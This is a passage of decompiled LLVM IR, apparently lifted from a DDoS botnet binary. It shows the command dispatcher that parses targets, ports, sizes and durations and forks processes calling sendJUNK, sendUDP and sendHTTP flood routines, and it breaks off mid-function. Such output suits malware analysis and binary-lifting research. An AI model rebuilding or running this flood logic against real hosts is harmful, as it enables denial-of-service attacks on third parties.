  %v3_804f9d4 = zext i1 %v0_804f9cc to i8
  %v4_804f9d4 = sub nsw i8 %v1_804f9d4, %v3_804f9d4
  %v15_804f9d4 = icmp eq i8 %v4_804f9d4, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f9dd = icmp eq i1 %v15_804f9d4, false
  br i1 %v1_804f9dd, label %dec_label_pc_804fb3b, label %dec_label_pc_804f9e3

dec_label_pc_804f9e3:                             ; preds = %dec_label_pc_804f998
  %v2_804f9d8 = sext i8 %v4_804f9d4 to i32
  %v9_804f9e3 = icmp ult i32 %tmp208, 3
  store i1 %v9_804f9e3, i1* %cf.global-to-local, align 1
  %v7_804f9e7 = icmp sgt i32 %tmp208, 3
  br i1 %v7_804f9e7, label %dec_label_pc_804f9ed, label %dec_label_pc_8050819

dec_label_pc_804f9ed:                             ; preds = %dec_label_pc_804f9e3
  %v1_804f9f0 = add i32 %tmp224, 8
  %v1_804f9f3 = inttoptr i32 %v1_804f9f0 to i32*
  %v2_804f9f3 = load i32, i32* %v1_804f9f3, align 4
  %v0_804f9f5 = load i32, i32* @esp, align 4
  %v5_804f9f5 = icmp ult i32 %v0_804f9f5, 12
  store i1 %v5_804f9f5, i1* %cf.global-to-local, align 1
  store i32 %v2_804f9f3, i32* %stack_var_-508, align 4
  %v1_804f9f9 = call i32 @atol(i32 %v2_804f9f3)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp257 = icmp slt i32 %v1_804f9f9, 1
  br i1 %tmp257, label %dec_label_pc_8050819, label %dec_label_pc_804fa09

dec_label_pc_804fa09:                             ; preds = %dec_label_pc_804f9ed
  %v1_804fa0c = add i32 %tmp224, 12
  %v1_804fa0f = inttoptr i32 %v1_804fa0c to i32*
  %v2_804fa0f = load i32, i32* %v1_804fa0f, align 4
  %v5_804fa11 = icmp ult i32* %stack_var_-492, inttoptr (i32 12 to i32*)
  store i1 %v5_804fa11, i1* %cf.global-to-local, align 1
  store i32 %v2_804fa0f, i32* %stack_var_-508, align 4
  %v1_804fa15 = call i32 @atol(i32 %v2_804fa0f)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp258 = icmp slt i32 %v1_804fa15, 1
  %tmp259 = icmp eq i1 %tmp258, false
  br i1 %tmp259, label %dec_label_pc_804fa26, label %dec_label_pc_8050819

dec_label_pc_804fa26:                             ; preds = %dec_label_pc_804fa09
  %v1_804fa29 = add i32 %tmp224, 4
  %v1_804fa2c = inttoptr i32 %v1_804fa29 to i32*
  %v2_804fa2c = load i32, i32* %v1_804fa2c, align 4
  %v2_804fa3a = load i32, i32* %v1_804f9f3, align 4
  store i1 %v5_804fa11, i1* %cf.global-to-local, align 1
  store i32 %v2_804fa3a, i32* %stack_var_-508, align 4
  %v1_804fa40 = call i32 @atol(i32 %v2_804fa3a)
  %v2_804fa54 = load i32, i32* %v1_804fa0f, align 4
  store i1 %v5_804fa11, i1* %cf.global-to-local, align 1
  store i32 %v2_804fa54, i32* %stack_var_-508, align 4
  %v1_804fa5a = call i32 @atol(i32 %v2_804fa54)
  %v5_804fa6e = icmp ult i32* %stack_var_-492, inttoptr (i32 8 to i32*)
  store i1 %v5_804fa6e, i1* %cf.global-to-local, align 1
  store i32 %v2_804fa2c, i32* %stack_var_-508, align 4
  %v2_804fa74 = inttoptr i32 %v2_804fa2c to i8*
  %v3_804fa74 = call i32 @__GI_strchr(i8* %v2_804fa74, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fa7c = icmp eq i32 %v3_804fa74, 0
  br i1 %v1_804fa7c, label %dec_label_pc_804fb07, label %dec_label_pc_804fa84

dec_label_pc_804fa84:                             ; preds = %dec_label_pc_804fa26
  store i32 %v2_804fa2c, i32* @eax, align 4
  store i1 %v5_804fa6e, i1* %cf.global-to-local, align 1
  store i32 %v2_804fa2c, i32* %stack_var_-508, align 4
  %v2_804fa93 = call i32 @__GI_strtok(i32 %v2_804fa2c, i32 ptrtoint (i32* @global_var_805add1.423 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fafc303 = icmp eq i32 %v2_804fa93, 0
  %v1_804fb03304 = icmp eq i1 %v4_804fafc303, false
  br i1 %v1_804fb03304, label %dec_label_pc_804faa3, label %dec_label_pc_804fb3b

dec_label_pc_804faa3:                             ; preds = %dec_label_pc_804fa84, %dec_label_pc_804fae4
  %storemerge115305 = phi i32 [ %v2_804faee, %dec_label_pc_804fae4 ], [ %v2_804fa93, %dec_label_pc_804fa84 ]
  %v0_804faa3 = call i32 @listFork()
  store i32 %v0_804faa3, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804faa8 = icmp eq i32 %v0_804faa3, 0
  %v1_804faaa = icmp eq i1 %v1_804faa8, false
  %v0_804fae4 = load i32, i32* @esp, align 4
  br i1 %v1_804faaa, label %dec_label_pc_804fae4, label %dec_label_pc_804faac

dec_label_pc_804faac:                             ; preds = %dec_label_pc_804faa3
  %v5_804faac = icmp ult i32 %v0_804fae4, 4
  store i1 %v5_804faac, i1* %cf.global-to-local, align 1
  store i32 %storemerge115305, i32* %stack_var_-508, align 4
  %v3_804fac1 = call i32 @sendJUNK(i32 %storemerge115305, i32 %v1_804fa40, i32 %v1_804fa5a)
  %v0_804fac9 = load i32, i32* @global_var_805d480.20, align 128
  store i1 %v5_804fa11, i1* %cf.global-to-local, align 1
  store i32 %v0_804fac9, i32* %stack_var_-508, align 4
  %v1_804fad2 = call i32 @__libc_close(i32 %v0_804fac9)
  store i1 %v5_804fa11, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-508, align 4
  %v1_804fadf = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804fae4:                             ; preds = %dec_label_pc_804faa3
  %v5_804fae4 = icmp ult i32 %v0_804fae4, 8
  store i1 %v5_804fae4, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-508, align 4
  %v2_804faee = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805add1.423 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fafc = icmp eq i32 %v2_804faee, 0
  %v1_804fb03 = icmp eq i1 %v4_804fafc, false
  br i1 %v1_804fb03, label %dec_label_pc_804faa3, label %dec_label_pc_804fb3b

dec_label_pc_804fb07:                             ; preds = %dec_label_pc_804fa26
  %v0_804fb07 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fb0c = icmp eq i32 %v0_804fb07, 0
  %v1_804fb0e = icmp eq i1 %v1_804fb0c, false
  br i1 %v1_804fb0e, label %dec_label_pc_8050819, label %dec_label_pc_804fb14

dec_label_pc_804fb14:                             ; preds = %dec_label_pc_804fb07
  %v0_804fb14 = load i32, i32* @esp, align 4
  %v5_804fb14 = icmp ult i32 %v0_804fb14, 4
  store i1 %v5_804fb14, i1* %cf.global-to-local, align 1
  store i32 %v2_804fa2c, i32* %stack_var_-508, align 4
  %v3_804fb29 = call i32 @sendJUNK(i32 %v2_804fa2c, i32 %v1_804fa40, i32 %v1_804fa5a)
  store i1 %v5_804fa11, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-508, align 4
  %v1_804fb36 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804fb3b:                             ; preds = %dec_label_pc_804fa84, %dec_label_pc_804fae4, %dec_label_pc_804f998
  %v2_804fb3e = load i32, i32* %v1_804f3fa, align 4
  store i1 false, i1* @df, align 1
  %v4_804fb5b = inttoptr i32 %v2_804fb3e to i8*
  store i32 ptrtoint ([4 x i8]* @global_var_805ae8c.447 to i32), i32* @edi, align 4
  %v7_804fb6d = call i32 @_strncmp(i8* %v4_804fb5b, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805ae8c.447, i32 0, i32 0), i32 4)
  %v8_804fb6d = urem i32 %v7_804fb6d, 2
  %v9_804fb6d = icmp eq i32 %v8_804fb6d, 0
  %v0_804fb6f = load i1, i1* %cf.global-to-local, align 1
  %v2_804fb6f = or i1 %v0_804fb6f, %v9_804fb6d
  %v3_804fb6f = zext i1 %v2_804fb6f to i32
  %v4_804fb6f = load i32, i32* @edx, align 4
  %v5_804fb6f = and i32 %v4_804fb6f, -256
  %v6_804fb6f = or i32 %v3_804fb6f, %v5_804fb6f
  %v7_804fb6f = xor i32 %v6_804fb6f, 1
  store i32 %v7_804fb6f, i32* @edx, align 4
  %v1_804fb77 = trunc i32 %v7_804fb6f to i8
  %v3_804fb77 = zext i1 %v0_804fb6f to i8
  %v4_804fb77 = sub nsw i8 %v1_804fb77, %v3_804fb77
  %v15_804fb77 = icmp eq i8 %v4_804fb77, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fb80 = icmp eq i1 %v15_804fb77, false
  br i1 %v1_804fb80, label %dec_label_pc_804fdc3, label %dec_label_pc_804fb86

dec_label_pc_804fb86:                             ; preds = %dec_label_pc_804fb3b
  %v2_804fb7b = sext i8 %v4_804fb77 to i32
  %v9_804fb86 = icmp ult i32 %tmp208, 5
  store i1 %v9_804fb86, i1* %cf.global-to-local, align 1
  %v7_804fb8a = icmp sgt i32 %tmp208, 5
  br i1 %v7_804fb8a, label %dec_label_pc_804fb90, label %dec_label_pc_8050819

dec_label_pc_804fb90:                             ; preds = %dec_label_pc_804fb86
  %v1_804fb93 = add i32 %tmp224, 12
  %v1_804fb96 = inttoptr i32 %v1_804fb93 to i32*
  %v2_804fb96 = load i32, i32* %v1_804fb96, align 4
  %v0_804fb98 = load i32, i32* @esp, align 4
  %v5_804fb98 = icmp ult i32 %v0_804fb98, 12
  store i1 %v5_804fb98, i1* %cf.global-to-local, align 1
  store i32 %v2_804fb96, i32* %stack_var_-508, align 4
  %v1_804fb9c = call i32 @atol(i32 %v2_804fb96)
  %v5_804fba4 = icmp ne i32 %v1_804fb9c, -1
  store i1 %v5_804fba4, i1* %cf.global-to-local, align 1
  %v10_804fba4 = icmp eq i32 %v1_804fb9c, -1
  br i1 %v10_804fba4, label %dec_label_pc_8050819, label %dec_label_pc_804fbad

dec_label_pc_804fbad:                             ; preds = %dec_label_pc_804fb90
  %v1_804fbb0 = add i32 %tmp224, 8
  %v1_804fbb3 = inttoptr i32 %v1_804fbb0 to i32*
  %v2_804fbb3 = load i32, i32* %v1_804fbb3, align 4
  %v5_804fbb5 = icmp ult i32* %stack_var_-492, inttoptr (i32 12 to i32*)
  store i1 %v5_804fbb5, i1* %cf.global-to-local, align 1
  store i32 %v2_804fbb3, i32* %stack_var_-508, align 4
  %v1_804fbb9 = call i32 @atol(i32 %v2_804fbb3)
  %v5_804fbc1 = icmp ne i32 %v1_804fbb9, -1
  store i1 %v5_804fbc1, i1* %cf.global-to-local, align 1
  %v10_804fbc1 = icmp eq i32 %v1_804fbb9, -1
  br i1 %v10_804fbc1, label %dec_label_pc_8050819, label %dec_label_pc_804fbca

dec_label_pc_804fbca:                             ; preds = %dec_label_pc_804fbad
  %v1_804fbcd = add i32 %tmp224, 16
  %v1_804fbd0 = inttoptr i32 %v1_804fbcd to i32*
  %v2_804fbd0 = load i32, i32* %v1_804fbd0, align 4
  store i1 %v5_804fbb5, i1* %cf.global-to-local, align 1
  store i32 %v2_804fbd0, i32* %stack_var_-508, align 4
  %v1_804fbd6 = call i32 @atol(i32 %v2_804fbd0)
  %v5_804fbde = icmp ne i32 %v1_804fbd6, -1
  store i1 %v5_804fbde, i1* %cf.global-to-local, align 1
  %v10_804fbde = icmp eq i32 %v1_804fbd6, -1
  br i1 %v10_804fbde, label %dec_label_pc_8050819, label %dec_label_pc_804fbe7

dec_label_pc_804fbe7:                             ; preds = %dec_label_pc_804fbca
  %v1_804fbea = add i32 %tmp224, 20
  %v1_804fbed = inttoptr i32 %v1_804fbea to i32*
  %v2_804fbed = load i32, i32* %v1_804fbed, align 4
  store i1 %v5_804fbb5, i1* %cf.global-to-local, align 1
  store i32 %v2_804fbed, i32* %stack_var_-508, align 4
  %v1_804fbf3 = call i32 @atol(i32 %v2_804fbed)
  %v5_804fbfb = icmp ne i32 %v1_804fbf3, -1
  store i1 %v5_804fbfb, i1* %cf.global-to-local, align 1
  %v10_804fbfb = icmp eq i32 %v1_804fbf3, -1
  br i1 %v10_804fbfb, label %dec_label_pc_8050819, label %dec_label_pc_804fc04

dec_label_pc_804fc04:                             ; preds = %dec_label_pc_804fbe7
  %v2_804fc0a = load i32, i32* %v1_804fbed, align 4
  store i1 %v5_804fbb5, i1* %cf.global-to-local, align 1
  store i32 %v2_804fc0a, i32* %stack_var_-508, align 4
  %v1_804fc10 = call i32 @atol(i32 %v2_804fc0a)
  %v1_804fc18 = add i32 %v1_804fc10, -65500
  %v5_804fc18 = icmp ult i32 %v1_804fc10, 65500
  %v6_804fc18 = sub i32 65499, %v1_804fc10
  %v7_804fc18 = and i32 %v6_804fc18, %v1_804fc10
  %v8_804fc18 = icmp slt i32 %v7_804fc18, 0
  store i1 %v5_804fc18, i1* %cf.global-to-local, align 1
  %v9_804fc18 = icmp eq i32 %v1_804fc18, 0
  %v10_804fc18 = icmp slt i32 %v1_804fc18, 0
  %v3_804fc1d = icmp eq i1 %v10_804fc18, %v8_804fc18
  %v4_804fc1d = icmp eq i1 %v9_804fc18, false
  %v5_804fc1d = and i1 %v4_804fc1d, %v3_804fc1d
  br i1 %v5_804fc1d, label %dec_label_pc_8050819, label %dec_label_pc_804fc23

dec_label_pc_804fc23:                             ; preds = %dec_label_pc_804fc04
  %v2_804fc29 = load i32, i32* %v1_804fbd0, align 4
  store i1 %v5_804fbb5, i1* %cf.global-to-local, align 1
  store i32 %v2_804fc29, i32* %stack_var_-508, align 4
  %v1_804fc2f = call i32 @atol(i32 %v2_804fc29)
  %v1_804fc37 = add i32 %v1_804fc2f, -32
  %v2_804fc37 = icmp ult i32 %v1_804fc2f, 32
  %v3_804fc37 = sub i32 31, %v1_804fc2f
  %v4_804fc37 = and i32 %v3_804fc37, %v1_804fc2f
  %v5_804fc37 = icmp slt i32 %v4_804fc37, 0
  store i1 %v2_804fc37, i1* %cf.global-to-local, align 1
  %v6_804fc37 = icmp eq i32 %v1_804fc37, 0
  %v7_804fc37 = icmp slt i32 %v1_804fc37, 0
  %v3_804fc3a = icmp eq i1 %v7_804fc37, %v5_804fc37
  %v4_804fc3a = icmp eq i1 %v6_804fc37, false
  %v5_804fc3a = and i1 %v4_804fc3a, %v3_804fc3a
  br i1 %v5_804fc3a, label %dec_label_pc_8050819, label %dec_label_pc_804fc40

dec_label_pc_804fc40:                             ; preds = %dec_label_pc_804fc23
  %v8_804fc40 = icmp ult i32 %tmp208, 7
  store i1 %v8_804fc40, i1* %cf.global-to-local, align 1
  %v12_804fc40 = icmp eq i32 %tmp208, 7
  %v1_804fc44 = icmp eq i1 %v12_804fc40, false
  br i1 %v1_804fc44, label %dec_label_pc_804fc63, label %dec_label_pc_804fc46

dec_label_pc_804fc46:                             ; preds = %dec_label_pc_804fc40
  %v1_804fc49 = add i32 %tmp224, 24
  %v1_804fc4c = inttoptr i32 %v1_804fc49 to i32*
  %v2_804fc4c = load i32, i32* %v1_804fc4c, align 4
  store i1 %v5_804fbb5, i1* %cf.global-to-local, align 1
  store i32 %v2_804fc4c, i32* %stack_var_-508, align 4
  %v1_804fc52 = call i32 @atol(i32 %v2_804fc4c)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp260 = icmp slt i32 %v1_804fc52, 1
  %tmp261 = icmp eq i1 %tmp260, false
  br i1 %tmp261, label %dec_label_pc_804fc63, label %dec_label_pc_8050819

dec_label_pc_804fc63:                             ; preds = %dec_label_pc_804fc46, %dec_label_pc_804fc40
  %v1_804fc66 = add i32 %tmp224, 4
  %v1_804fc69 = inttoptr i32 %v1_804fc66 to i32*
  %v2_804fc69 = load i32, i32* %v1_804fc69, align 4
  %v2_804fc77 = load i32, i32* %v1_804fbb3, align 4
  store i1 %v5_804fbb5, i1* %cf.global-to-local, align 1
  store i32 %v2_804fc77, i32* %stack_var_-508, align 4
  %v1_804fc7d = call i32 @atol(i32 %v2_804fc77)
  %v2_804fc91 = load i32, i32* %v1_804fb96, align 4
  store i1 %v5_804fbb5, i1* %cf.global-to-local, align 1
  store i32 %v2_804fc91, i32* %stack_var_-508, align 4
  %v1_804fc97 = call i32 @atol(i32 %v2_804fc91)
  %v2_804fca8 = load i32, i32* %v1_804fbd0, align 4
  store i1 %v5_804fbb5, i1* %cf.global-to-local, align 1
  store i32 %v2_804fca8, i32* %stack_var_-508, align 4
  %v1_804fcae = call i32 @atol(i32 %v2_804fca8)
  %v2_804fcbf = load i32, i32* %v1_804fbed, align 4
  store i1 %v5_804fbb5, i1* %cf.global-to-local, align 1
  store i32 %v2_804fcbf, i32* %stack_var_-508, align 4
  %v1_804fcc5 = call i32 @atol(i32 %v2_804fcbf)
  store i1 %v8_804fc40, i1* %cf.global-to-local, align 1
  br i1 %v1_804fc44, label %dec_label_pc_804fcfc, label %dec_label_pc_804fcd6

dec_label_pc_804fcd6:                             ; preds = %dec_label_pc_804fc63
  %v1_804fcd9 = add i32 %tmp224, 24
  %v1_804fcdc = inttoptr i32 %v1_804fcd9 to i32*
  %v2_804fcdc = load i32, i32* %v1_804fcdc, align 4
  store i1 %v5_804fbb5, i1* %cf.global-to-local, align 1
  store i32 %v2_804fcdc, i32* %stack_var_-508, align 4
  %v1_804fce2 = call i32 @atol(i32 %v2_804fcdc)
  %v0_804fce7 = load i32, i32* @esp, align 4
  %v2_804fce7 = icmp ugt i32 %v0_804fce7, -17
  store i1 %v2_804fce7, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804fcfc

dec_label_pc_804fcfc:                             ; preds = %dec_label_pc_804fc63, %dec_label_pc_804fcd6
  %storemerge48 = phi i32 [ %v1_804fce2, %dec_label_pc_804fcd6 ], [ 10, %dec_label_pc_804fc63 ]
  store i32 %storemerge48, i32* @esi, align 4
  %v5_804fd0b = icmp ult i32* %stack_var_-492, inttoptr (i32 8 to i32*)
  store i1 %v5_804fd0b, i1* %cf.global-to-local, align 1
  store i32 %v2_804fc69, i32* %stack_var_-508, align 4
  %v2_804fd11 = inttoptr i32 %v2_804fc69 to i8*
  %v3_804fd11 = call i32 @__GI_strchr(i8* %v2_804fd11, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fd19 = icmp eq i32 %v3_804fd11, 0
  br i1 %v1_804fd19, label %dec_label_pc_804fd89, label %dec_label_pc_804fd1d

dec_label_pc_804fd1d:                             ; preds = %dec_label_pc_804fcfc
  store i32 %v2_804fc69, i32* @eax, align 4
  store i1 %v5_804fd0b, i1* %cf.global-to-local, align 1
  store i32 %v2_804fc69, i32* %stack_var_-508, align 4
  %v2_804fd2c = call i32 @__GI_strtok(i32 %v2_804fc69, i32 ptrtoint (i32* @global_var_805add1.423 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fd81300 = icmp eq i32 %v2_804fd2c, 0
  %v1_804fd85301 = icmp eq i1 %v4_804fd81300, false
  br i1 %v1_804fd85301, label %dec_label_pc_804fd39, label %dec_label_pc_804fdc3

dec_label_pc_804fd39:                             ; preds = %dec_label_pc_804fd1d, %dec_label_pc_804fd6c
  %storemerge116302 = phi i32 [ %v2_804fd76, %dec_label_pc_804fd6c ], [ %v2_804fd2c, %dec_label_pc_804fd1d ]
  %v0_804fd39 = call i32 @listFork()
  store i32 %v0_804fd39, i32* @eax, align 4
  %v1_804fd3e = icmp eq i32 %v0_804fd39, 0
  %v1_804fd40 = icmp eq i1 %v1_804fd3e, false
  %v0_804fd6c = load i32, i32* @esp, align 4
  %v5_804fd6c = icmp ult i32 %v0_804fd6c, 8
  store i1 %v5_804fd6c, i1* %cf.global-to-local, align 1
  br i1 %v1_804fd40, label %dec_label_pc_804fd6c, label %dec_label_pc_804fd42

dec_label_pc_804fd42:                             ; preds = %dec_label_pc_804fd39
  store i32 %v1_804fcc5, i32* %stack_var_-508, align 4
  %v6_804fd5a = call i32 @sendUDP(i32 %storemerge116302, i32 %v1_804fc7d, i32 %v1_804fc97, i32 %v1_804fcae, i32 %v1_804fcc5, i32 %storemerge48)
  store i1 %v5_804fbb5, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-508, align 4
  %v1_804fd67 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804fd6c:                             ; preds = %dec_label_pc_804fd39
  store i32 0, i32* %stack_var_-508, align 4
  %v2_804fd76 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805add1.423 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fd81 = icmp eq i32 %v2_804fd76, 0
  %v1_804fd85 = icmp eq i1 %v4_804fd81, false
  br i1 %v1_804fd85, label %dec_label_pc_804fd39, label %dec_label_pc_804fdc3

dec_label_pc_804fd89:                             ; preds = %dec_label_pc_804fcfc
  %v0_804fd89 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fd8e = icmp eq i32 %v0_804fd89, 0
  %v1_804fd90 = icmp eq i1 %v1_804fd8e, false
  br i1 %v1_804fd90, label %dec_label_pc_8050819, label %dec_label_pc_804fd96

dec_label_pc_804fd96:                             ; preds = %dec_label_pc_804fd89
  %v0_804fd96 = load i32, i32* @esp, align 4
  %v5_804fd96 = icmp ult i32 %v0_804fd96, 8
  store i1 %v5_804fd96, i1* %cf.global-to-local, align 1
  store i32 %v1_804fcc5, i32* %stack_var_-508, align 4
  %v6_804fdb1 = call i32 @sendUDP(i32 %v2_804fc69, i32 %v1_804fc7d, i32 %v1_804fc97, i32 %v1_804fcae, i32 %v1_804fcc5, i32 %storemerge48)
  store i1 %v5_804fbb5, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-508, align 4
  %v1_804fdbe = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804fdc3:                             ; preds = %dec_label_pc_804fd1d, %dec_label_pc_804fd6c, %dec_label_pc_804fb3b
  %v2_804fdc6 = load i32, i32* %v1_804f3fa, align 4
  store i1 false, i1* @df, align 1
  %v4_804fde3 = inttoptr i32 %v2_804fdc6 to i8*
  store i32 %v2_804fdc6, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_805ae90.448 to i32), i32* @edi, align 4
  %v7_804fdf5 = call i32 @_strncmp(i8* %v4_804fde3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805ae90.448, i32 0, i32 0), i32 5)
  %v8_804fdf5 = urem i32 %v7_804fdf5, 2
  %v9_804fdf5 = icmp eq i32 %v8_804fdf5, 0
  %v0_804fdf7 = load i1, i1* %cf.global-to-local, align 1
  %v2_804fdf7 = or i1 %v0_804fdf7, %v9_804fdf5
  %v3_804fdf7 = zext i1 %v2_804fdf7 to i32
  %v4_804fdf7 = load i32, i32* @edx, align 4
  %v5_804fdf7 = and i32 %v4_804fdf7, -256
  %v6_804fdf7 = or i32 %v3_804fdf7, %v5_804fdf7
  %v7_804fdf7 = xor i32 %v6_804fdf7, 1
  store i32 %v7_804fdf7, i32* @edx, align 4
  %v3_804fdfd = and i32 %v7_804fdf5, -256
  %v1_804fdff = trunc i32 %v7_804fdf7 to i8
  %v3_804fdff = zext i1 %v0_804fdf7 to i8
  %v4_804fdff = sub nsw i8 %v1_804fdff, %v3_804fdff
  %v15_804fdff = icmp eq i8 %v4_804fdff, 0
  %v20_804fdff = zext i8 %v4_804fdff to i32
  %v23_804fdff = or i32 %v20_804fdff, %v3_804fdfd
  store i32 %v23_804fdff, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fe08 = icmp eq i1 %v15_804fdff, false
  br i1 %v1_804fe08, label %dec_label_pc_804ff8f, label %dec_label_pc_804fe0e

dec_label_pc_804fe0e:                             ; preds = %dec_label_pc_804fdc3
  %v2_804fe03 = sext i8 %v4_804fdff to i32
  %v9_804fe0e = icmp ult i32 %tmp208, 5
  store i1 %v9_804fe0e, i1* %cf.global-to-local, align 1
  %v7_804fe12 = icmp sgt i32 %tmp208, 5
  br i1 %v7_804fe12, label %dec_label_pc_804fe18, label %dec_label_pc_8050819

dec_label_pc_804fe18:                             ; preds = %dec_label_pc_804fe0e
  %v1_804fe1b = add i32 %tmp224, 4
  %v1_804fe1e = inttoptr i32 %v1_804fe1b to i32*
  %v2_804fe1e = load i32, i32* %v1_804fe1e, align 4
  %v0_804fe20 = load i32, i32* @esp, align 4
  %v5_804fe20 = icmp ult i32 %v0_804fe20, 8
  store i1 %v5_804fe20, i1* %cf.global-to-local, align 1
  store i32 %v2_804fe1e, i32* %stack_var_-508, align 4
  %v2_804fe26 = inttoptr i32 %v2_804fe1e to i8*
  %v3_804fe26 = call i32 @__GI_strchr(i8* %v2_804fe26, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fe2e = icmp eq i32 %v3_804fe26, 0
  br i1 %v1_804fe2e, label %dec_label_pc_804ff03, label %dec_label_pc_804fe36

dec_label_pc_804fe36:                             ; preds = %dec_label_pc_804fe18
  %v2_804fe3c = load i32, i32* %v1_804fe1e, align 4
  store i32 %v2_804fe3c, i32* @eax, align 4
  %v5_804fe3e = icmp ult i32* %stack_var_-492, inttoptr (i32 8 to i32*)
  store i1 %v5_804fe3e, i1* %cf.global-to-local, align 1
  store i32 %v2_804fe3c, i32* %stack_var_-508, align 4
  %v2_804fe47 = call i32 @__GI_strtok(i32 %v2_804fe3c, i32 ptrtoint (i32* @global_var_805add1.423 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fef4298 = icmp eq i32 %v2_804fe47, 0
  %v1_804fef8299 = icmp eq i1 %v4_804fef4298, false
  br i1 %v1_804fef8299, label %dec_label_pc_804fe57, label %dec_label_pc_804ff8f

dec_label_pc_804fe57:                             ; preds = %dec_label_pc_804fe36, %dec_label_pc_804fedf
  %v0_804fe57 = call i32 @listFork()
  store i32 %v0_804fe57, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fe5c = icmp eq i32 %v0_804fe57, 0
  %v1_804fe5e = icmp eq i1 %v1_804fe5c, false
  br i1 %v1_804fe5e, label %dec_label_pc_804fedf, label %dec_label_pc_804fe60

dec_label_pc_804fe60:                             ; preds = %dec_label_pc_804fe57
  %v1_804fe63 = add i32 %tmp224, 24
  %v1_804fe66 = inttoptr i32 %v1_804fe63 to i32*
  %v2_804fe66 = load i32, i32* %v1_804fe66, align 4
  %v0_804fe68 = load i32, i32* @esp, align 4
  %v5_804fe68 = icmp ult i32 %v0_804fe68, 12
  store i1 %v5_804fe68, i1* %cf.global-to-local, align 1
  store i32 %v2_804fe66, i32* %stack_var_-508, align 4
  %v1_804fe6c = call i32 @atol(i32 %v2_804fe66)
  store i32 %v1_804fe6c, i32* @ebx, align 4
  %v1_804fe79 = add i32 %tmp224, 20
  %v1_804fe7c = inttoptr i32 %v1_804fe79 to i32*
  %v2_804fe7c = load i32, i32* %v1_804fe7c, align 4
  %v5_804fe7e = icmp ult i32* %stack_var_-492, inttoptr (i32 12 to i32*)
  store i1 %v5_804fe7e, i1* %cf.global-to-local, align 1
  store i32 %v2_804fe7c, i32* %stack_var_-508, align 4
  %v1_804fe82 = call i32 @atol(i32 %v2_804fe7c)
  store i32 %v1_804fe82, i32* @esi, align 4
  %v1_804fe8f = add i32 %tmp224, 16
  %v1_804fe92 = inttoptr i32 %v1_804fe8f to i32*
  %v2_804fe92 = load i32, i32* %v1_804fe92, align 4
  store i32 %v2_804fe92, i32* @edi, align 4
  %v1_804fe99 = add i32 %tmp224, 12
  %v1_804fe9c = inttoptr i32 %v1_804fe99 to i32*
  %v2_804fe9c = load i32, i32* %v1_804fe9c, align 4
  store i1 %v5_804fe7e, i1* %cf.global-to-local, align 1
  store i32 %v2_804fe9c, i32* %stack_var_-508, align 4
  %v1_804fea2 = call i32 @atol(i32 %v2_804fe9c)
  %v1_804feb5 = add i32 %tmp224, 8
  %v1_804feb8 = inttoptr i32 %v1_804feb5 to i32*
  %v2_804feb8 = load i32, i32* %v1_804feb8, align 4
  store i32 %v2_804feb8, i32* %edx.global-to-local, align 4
  %v2_804fec2 = load i32, i32* %v1_804fe1e, align 4
  store i1 %v5_804fe3e, i1* %cf.global-to-local, align 1
  %v0_804fec7 = load i32, i32* @ebx, align 4
  %v0_804fec8 = load i32, i32* @esi, align 4
  store i32 %v0_804fec8, i32* %stack_var_-508, align 4
  %v0_804fec9 = load i32, i32* @edi, align 4
  %v6_804fecd = trunc i32 %v1_804fea2 to i16
  %v7_804fecd = call i32 @sendHTTP(i32 %v2_804fec2, i32 %v2_804feb8, i16 %v6_804fecd, i32 %v0_804fec9, i32 %v0_804fec8, i32 %v0_804fec7)
  store i1 %v5_804fe7e, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-508, align 4
  %v1_804feda = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804fedf:                             ; preds = %dec_label_pc_804fe57
  %v0_804fedf = load i32, i32* @esp, align 4
  %v5_804fedf = icmp ult i32 %v0_804fedf, 8
  store i1 %v5_804fedf, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-508, align 4
  %v2_804fee9 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805add1.423 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fef4 = icmp eq i32 %v2_804fee9, 0
  %v1_804fef8 = icmp eq i1 %v4_804fef4, false
  br i1 %v1_804fef8, label %dec_label_pc_804fe57, label %dec_label_pc_804ff8f

dec_label_pc_804ff03:                             ; preds = %dec_label_pc_804fe18
  %v0_804ff03 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ff08 = icmp eq i32 %v0_804ff03, 0
